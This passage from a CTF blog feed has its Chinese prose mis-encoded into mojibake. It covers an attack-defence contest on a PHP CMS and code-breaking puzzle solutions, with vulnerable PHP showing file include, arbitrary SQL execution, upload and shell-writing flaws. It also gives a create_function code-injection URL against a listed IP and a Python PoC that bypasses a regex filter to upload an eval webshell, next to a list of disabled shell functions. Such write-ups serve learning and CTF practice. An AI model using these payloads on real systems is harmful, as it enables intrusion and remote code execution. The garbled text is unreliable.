(è´­ä¹°æˆæƒç‰ˆï¼Œæ­¤ä¿¡æ¯å°†ä¸åœ¨æ˜¾ç¤ºã€‚)&lt;/h1&gt;&lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot;&gt;&lt;tr&gt;&lt;td width=&quot;46%&quot; style=&quot;border-right:1px #CCC solid&quot;&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶å¼€å‘ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;å“ˆå°”æ»¨ä¼Ÿæˆç§‘æŠ€æœ‰é™å…¬å¸&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶åç§°ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;emmm&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶å…¶å®ƒå¸¸ç”¨åç§°ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å‚²æ´¾ã€å‚²æ´¾CMSã€OPCMS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;ä¸“åˆ©è¯ä¹¦ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;2015SR078193Â Â Â Â &lt;a href=&quot;javascript:dialog()&quot;&gt;[æŸ¥çœ‹]&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;é¡¹ç›®è´Ÿè´£äººï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å”æ™“ä¼Ÿ&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;å¼€å‘å›¢é˜Ÿæˆå‘˜ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å¤§é¹ã€è¶…è¶…ã€å°å¨Ÿ&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;ç›¸å…³é“¾æ¥ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=2&quot; target=&quot;_blank&quot;&gt;é—®é¢˜åé¦ˆ&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;æ¨¡æ¿ä¸‹è½½&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;æ’ä»¶ä¸‹è½½&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;td width=&quot;54%&quot; valign=&quot;top&quot;&gt;&lt;style type=&quot;text/css&quot;&gt;.module ul li&#123;height:22px;line-height:22px;color:#CCC&#125;.module ul li a&#123;color:#333&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.emmm.net/club/api.php?mod=js&amp;bid=5&quot;&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$empower</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h2><p>è¿™ä¸ªæ˜¯æŠ“æµé‡å‘ç°çš„æ´,çœ‹åˆ°client/user/index.phpçš„253è¡Œä»»æ„æ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨å±€æœç´¢<code>$_GET['img']</code> <a href="/images/2018/12/2018-12-17-15-35-53-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-17-15-35-53-åˆ›å»ºçš„æˆªå›¾.png" /></a> å‘ç°åªæœ‰è¿™æœ‰è¿™ä¸ªå˜é‡,å¯¹å…¨å±€æ²¡æœ‰å½±å“,ç›´æ¥åˆ é™¤æ‰å³å¯</p><h2 id="ä»»æ„sqlæ‰§è¡Œ">ä»»æ„sqlæ‰§è¡Œ</h2><p>åšåˆ°è¿™é‡Œæ„Ÿè§‰å·®ä¸å¤šäº†,äºæ˜¯æƒ³ç™»å½•å»åå°çœ‹ä¸‹,ç”¨ä¸»åŠæ–¹çš„å¯†ç ç™»å½•,å‘ç°ç™»å½•å¤±è´¥(å› ä¸ºå¯†ç å¾ˆå¤æ‚,ç±»ä¼¼äºsshçš„å¯†ç ,æ‰€ä»¥æ²¡è€ƒè™‘è¢«ä¿®æ”¹) è¿™é‡Œå› ä¸ºåå°å­˜åœ¨ä¸€ä¸ªæ“ä½œæ•°æ®åº“çš„åŠŸèƒ½,è€Œä¸”å¹¶æ²¡æœ‰åšæƒé™æ§åˆ¶,æ‰€ä»¥è¿™é‡Œå­˜åœ¨æ…shiç°è±¡,å¯ä»¥ç–¯ç‹‚ä¿®æ”¹ä½ çš„adminå¯†ç è®©ä½ æŒ‚æ‰check,å½“ç„¶,ä½ ä¹Ÿå¯ä»¥é€‰æ‹©åœ¨æ•°æ®åº“æ‹¿åˆ°flag åˆ†æä¸€ä¸‹ä»£ç  è¿‡äº†å£ä»¤ä¹‹å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sql&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sql</span> <span class="keyword">as</span> <span class="variable">$op</span>)&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$db</span> -&gt; <span class="title function_ invoke__">create</span>(<span class="variable">$op</span>,<span class="number">2</span>);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>$db-&gt;create</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"><span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>,<span class="variable">$u</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$u</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$Query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;create table &quot;</span>.<span class="variable">$o</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$u</span> == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="variable">$Query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$o</span>,<span class="variable">$this</span> -&gt; conn);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$Query</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶,ä»»æ„sqlè¯­å¥æ‰§è¡Œ,ç¬¬ä¸€å¤©çº¿ä¸‹æ²¡ç»éªŒ,æ²¡æ³¨æ„å®¡åå°,å¯¼è‡´è¢«åˆ«äººç›´æ¥åˆ åº“äº†,è€Œæˆ‘ä»¬åº“åˆæ²¡æœ‰å¤‡ä»½... ç„¶åç”¨webæ ¹ç›®å½•çš„sqlæ–‡ä»¶é‡è£…æ•°æ®åº“,å‘ç°æ•°æ®åº“æ–‡ä»¶æ˜¯é”™çš„ ä¸€æ˜¯adminçš„å¯†ç å°±æ˜¯admin äºŒæ˜¯emmm_userå°‘äº†ä¸€ä¸ªåˆ—,å¯¼è‡´åé¢useræ³¨å†Œç–¯ç‹‚å‡ºé”™... æ™šä¸Šå›å»ä¹‹åæƒ³åˆ°å¯ä»¥é‡è£…ä¸€ä¸‹cmsç„¶åæŠŠåº“å¯¼å‡ºç¬¬äºŒå¤©å†å¯¼å…¥,ä½†æ˜¯ç¬¬äºŒå¤©ä¸»åŠæ–¹æŠŠåº“æƒé™æ”¹äº†...æ²¡æœ‰æƒé™å»æ”¹é”™çš„é‚£ä¸ªè¡¨... å†åæ¥å»è”ç³»ä¸»åŠæ–¹è®©åŠ ä¸Šäº†...ç»ˆäºç¬¬ä¸€æ¬¡ä¸æŒ‚checkäº† ä¸è¿‡å¥½äº†ä¸€è½®ç¬¬äºŒè½®åˆdownäº†,å¾ˆå¥‡æ€ª,å› ä¸ºæ‰€æœ‰çš„éƒ¨åˆ†éƒ½æ²¡æœ‰å‡ºé—®é¢˜...</p><h2 id="fileboxä»»æ„æ–‡ä»¶ä¸Šä¼ ">fileboxä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><p>fileboxä¸­æ²¡æœ‰åšæƒé™ç®¡ç†,ä¹Ÿæ²¡æœ‰åšä¸Šä¼ è¿‡æ»¤,å› æ­¤å¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·ä»»æ„æ–‡ä»¶ä¸Šä¼  <a href="/images/2018/12/2018-12-19-12-02-47-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-02-47-åˆ›å»ºçš„æˆªå›¾.png" /></a> <a href="/images/2018/12/2018-12-19-12-03-52-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-03-52-åˆ›å»ºçš„æˆªå›¾.png" /></a> fileboxä¸­åˆ©ç”¨ç‚¹åº”è¯¥è¿˜æœ‰å…¶ä»–çš„...è¿™é‡Œåªä¸¾å‡ºä¸€ä¸ªä¾‹å­</p><h2 id="å¤‡ä»½å†™shell">å¤‡ä»½å†™shell</h2><p>çœ‹åˆ°<code>bakgo.php</code>ä¸­çš„ä¸€æ®µä»£ç  <a href="/images/2018/12/2018-12-19-12-12-01-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-12-01-åˆ›å»ºçš„æˆªå›¾.png" /></a> writefileå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writefile</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$method</span> = <span class="string">&#x27;w&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$fsqlzip</span>, <span class="variable">$_POST</span>;;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;<span class="subst">&#123;$_POST[filename]&#125;</span>_pg<span class="subst">&#123;$_POST[page]&#125;</span>.php&quot;</span>;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">$_POST</span>[dir]/<span class="subst">$file</span>&quot;</span>, <span class="string">&quot;<span class="subst">$method</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¯ä»¥é€šè¿‡æ„é€ filenameé€ æˆæ–‡ä»¶å†™å…¥ <a href="/images/2018/12/2018-12-19-12-44-53-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-44-53-åˆ›å»ºçš„æˆªå›¾-1024x329.png" /></a> ç„¶åæ‹¿åˆ°shell,è™½ç„¶ä¼šä¸€ç›´åˆ·æ–°,ä½†ç›´æ¥ç”¨curlå°±ok <a href="/images/2018/12/2018-12-19-12-46-30-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-46-30-åˆ›å»ºçš„æˆªå›¾.png" /></a> åé¢çš„å¼•å¯¼æ–‡ä»¶å†…å®¹åº”è¯¥ä¹Ÿå¯ä»¥å†™shell,è¿™é‡Œæˆ‘æ²¡çœ‹å°±ä¸å†™äº† å¤§æ¦‚web1å®¡å‡ºæ¥çš„å°±è¿™äº›äº†,ä¿®æ´çš„è¯åªç”¨åŠ ä¸€ä¸ªæƒé™ç®¡ç†å°±å¥½,è®¾ç½®éadminæ— æ³•ä½¿ç”¨è¿™äº›manageçš„ä¸šåŠ¡ <a href="/images/2018/12/2018-12-19-12-51-02-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-19-12-51-02-åˆ›å»ºçš„æˆªå›¾.png" /></a> ä¸è¿‡è®¾ç½®å¥½äº†è¿™ä¸ªä¹Ÿè¿˜æ˜¯å¯ä»¥è®©åˆ«äººdowncheckçš„,æ¯”å¦‚ç–¯ç‹‚è®¿é—®åˆ«äººçš„æ•°æ®åº“é‡ç½®æ–‡ä»¶,è€Œæ•°æ®åº“é‡ç½®æ–‡ä»¶ä¸­çš„adminå¯†ç æ˜¯é”™è¯¯çš„,è€Œä¸”è¿™é‡Œæ²¡æœ‰æƒé™æ§åˆ¶æ¨¡å—,æ‰€ä»¥å°±å¯¼è‡´downcheck. åæ¥æƒ³äº†æƒ³å¯ä»¥æ”¹ä¸€ä¸‹æ•°æ®åº“å¤‡ä»½çš„é…ç½®,æˆ–è€…å¼ºè¡ŒåŠ èº«ä»½è®¤è¯æ¨¡å—....ä¸è¿‡éƒ½æ˜¯èµ›åçš„äº‹äº†</p><h1 id="ç¬¬äºŒå¤©çš„é¢˜">ç¬¬äºŒå¤©çš„é¢˜</h1><p>mvcæ¡†æ¶çš„cms ä¸€ä¸Šæ¥æ‰“åŒ…wwwè®©é˜Ÿå‹dç›¾æ‰«ä¸€ä¸‹,å‘ç°ä¸€å¥è¯ åˆ æ‰ä¸€å¥è¯ç„¶åæ‰‹åŠ¨æ‰“ä¸€æ³¢äº¤ä¸€ä¸‹flag ç„¶åå±…ç„¶è¿˜æ‹¿åˆ°ä¸€è¡€äº†2333 åç»­å¥½åƒæœ‰é˜ŸæŒ–åˆ°è¯»æ–‡ä»¶çš„æ´äº†,ä¸è¿‡æ²¡æ€ä¹ˆçœ‹,æ‰“åˆ°åé¢æœ‰ç‚¹ç´¯äº†ä¸æ€ä¹ˆæƒ³æ‰“äº†,åç»­æœ‰æ—¶é—´åœ¨çœ‹çœ‹è¿™ä¸ªmvc æœ€åä¸€æ³¢æ‰åˆ†æ‰åˆ°ç¬¬7,tcl ORZ</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phå¸ˆå‚…çš„ä»£ç å®¡è®¡æ˜Ÿçƒ</title>
      <link href="/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰çœ‹åˆ°phå¸ˆå‚…ä»£ç å®¡è®¡æ˜Ÿçƒçš„å¹¿å‘Š,çœ‹äº†ç¬¬ä¸€é“é¢˜å°±è§‰å¾—è›®æœ‰æ„æ€çš„,äºæ˜¯å°±å…¥äº†ä¸€æ³¢2333,ç®€å•è®°å½•ä¸€ä¸‹è‡ªå·±èƒ½åšçš„æˆ–æ˜¯æ‰¾åˆ°wpå­¦ä¹ çš„é¢˜ç›®..é¡ºæ‰‹æ¨å¹¿ä¸€ä¸‹.. é“¾æ¥:<a href="https://code-breaking.com/puzzle/1/" title="https://code-breaking.com/puzzle/1/">https://code-breaking.com/puzzle/1/</a></p><h1 id="easy---function">easy - function</h1><h2 id="æºç ">æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯">æ€è·¯</h2><p>é¦–å…ˆçœ‹åˆ°åŠ¨æ€è°ƒç”¨çš„actionåšäº†æ­£åˆ™é™åˆ¶,æ‰€ä»¥æƒ³åŠæ³•ç»•æ­£åˆ™,ä¸€å¼€å§‹æƒ³é€šè¿‡èŒƒå›´è§£é‡Šæ“ä½œç¬¦æ¥ç»•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯”å¦‚SimpleXMLElement::xpath</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ‰¾äº†å¾ˆä¹…,å‘ç°å¾ˆå¤šä¸œè¥¿éƒ½ç”¨ä¸èµ·æ¥,å› ä¸ºå¾ˆéš¾æ‰¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºçš„æœ‰ç”¨çš„ä¸œè¥¿.æ²¡åŠæ³•å†å»æ‰¾äº†æ‰¾èµ„æ–™ ç„¶åå‘ç°å¯ä»¥é€šè¿‡å‘½åç©ºé—´æ¥ç»•è¿‡å‰é¢çš„é™åˆ¶,æ¯”å¦‚<code>var_dump</code>è¡¨ç¤ºå…¨å±€å‘½åç©ºé—´ <a href="/images/2018/11/code_for_fun_1.jpg"><img src="/images/2018/11/code_for_fun_1.jpg" /></a> ä½†æ˜¯åˆæœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºå‘¢? æƒ³åˆ°hitconå‡ºç°è¿‡çš„<code>create_function</code>åˆ©ç”¨å¤šçº¿ç¨‹æš´ç ´åŒ¿åå‡½æ•° æ˜¾ç„¶create_functionæ˜¯å¯ä»¥ç”¨çš„ <a href="/images/2018/11/code_for_fun_2.jpg"><img src="/images/2018/11/code_for_fun_2.jpg" /></a> å¼ƒç”¨æ— æ‰€è°“,åé¢å‘ç°è¿˜æ˜¯å¯ä»¥ç”¨çš„ <code>create_function</code>å¯èƒ½å­˜åœ¨çš„é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾,å°±æ˜¯ä»£ç æ³¨å…¥,æ¯”å¦‚ <a href="/images/2018/11/code_for_fun_3.jpg"><img src="/images/2018/11/code_for_fun_3.jpg" /></a> ä»è€Œå¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œ,ä½†æ˜¯åˆç¢°åˆ°é—®é¢˜äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disable functions</span><br><span class="line"></span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure><p>æƒ³åˆ°flagè‚¯å®šæ˜¯æ–‡ä»¶å½¢å¼,é‚£ä¹ˆç”¨<code>scandir</code>å°±å¥½,åœ¨ä¸Šä¸€çº§ç›®å½•å‘ç°flag <a href="/images/2018/11/code_for_fun_4.jpg"><img src="/images/2018/11/code_for_fun_4.jpg" /></a> ç”¨<code>file_get_contents</code>è·å–flag,æœ€ç»ˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=create_function&amp;arg=echo%20%22123%22;&#125;var_dump(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));/*</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°è¿”å›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Deprecated: Function <span class="title function_ invoke__">create_function</span>() is deprecated in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Warning: Unterminated comment starting line <span class="number">1</span> in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">8</span>) : runtime-created <span class="function"><span class="keyword">function</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br><span class="line"><span class="function"><span class="title">string</span>(<span class="params"><span class="number">38</span></span>) &quot;<span class="title">flag</span></span>&#123;<span class="number">03</span>fdc0ee2fc464aac3c40ef0e20dcb5a&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h1 id="easy---pcrewaf">easy - pcrewaf</h1><h2 id="æºç -1">æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_php</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>, <span class="number">0755</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$user_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$path</span>&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="æ€è·¯-1">æ€è·¯</h2><p>ä¸€å¼€å§‹å¤´é“,è§‰å¾—èƒ½è¿‡è¿™ä¸ªæ­£åˆ™.. ä¹Ÿç¡®å®å¯ä»¥,åœ¨php7ä»¥ä¸‹å¯ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…·ä½“å¯ä»¥å»çœ‹phpçš„æºç  php7ä¹‹å‰çš„æœ€é«˜ç‰ˆæœ¬5.6.39 <a href="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l" title="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l">https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l</a> <a href="/images/2018/11/2018-12-06-18-11-14-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-18-11-14-åˆ›å»ºçš„æˆªå›¾.png" /></a> è€Œä¸€åˆ°php7å°±æ²¡è¿™ç§è§£æäº† <a href="/images/2018/11/2018-12-06-18-13-25-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-18-13-25-åˆ›å»ºçš„æˆªå›¾.png" /></a> è€Œç›®æ ‡ç¯å¢ƒå°±æ˜¯php7,åˆ°è¿™é‡Œæˆ‘å°±å·²ç»ä¸ä¼šäº†... åæ¥çœ‹çš„wp <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a> è¯´åˆ°åº•å°±æ˜¯PHPçš„pcre.backtrack_limité™åˆ¶åˆ©ç”¨,å½“å›æº¯æ¬¡æ•°è¶…è¿‡é™åˆ¶çš„æ—¶å€™,æ­£åˆ™è¡¨è¾¾å¼ä¼šè¿”å›false,è€Œä¸æ˜¯0æˆ–1 é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¿›è¡Œæ”»å‡»,pocçš„è¯å‰é¢çš„é“¾æ¥ä¹Ÿæœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure><p>æƒ³è¦é¿å…è¿™ä¸ªé—®é¢˜,åœ¨ä½¿ç”¨çš„æ—¶å€™ç”¨<code>===</code>æ¥åˆ¤æ–­è€Œä¸æ˜¯<code>==</code>æˆ–ç›´æ¥åˆ¤æ–­</p><h1 id="easy---phpmagic">easy - phpmagic</h1><h2 id="æºç -2">æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 